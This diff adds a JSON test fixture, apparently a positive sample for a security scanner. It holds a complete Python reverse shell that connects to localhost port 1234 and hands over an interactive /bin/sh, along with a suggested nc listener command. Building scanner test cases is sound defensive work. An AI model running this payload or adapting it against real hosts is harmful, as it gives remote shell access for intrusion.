@@ -1,0 +1,8 @@
+{
+  "_type": "function_vocabulary",
+  "_grammar": "revshell_localhost",
+  "_exec": "python",
+  "_mode": "execute",
+  "_description": "LAB fixture: reverse TCP shell to 127.0.0.1:1234. Positive test payload for the Model Security RE scanner; localhost-only, run on your own host with nc -lvnp 1234 listening.",
+  "revshell": "import socket, subprocess, os\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.1', 1234))\nos.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\nsubprocess.call(['/bin/sh', '-i'])"
+}
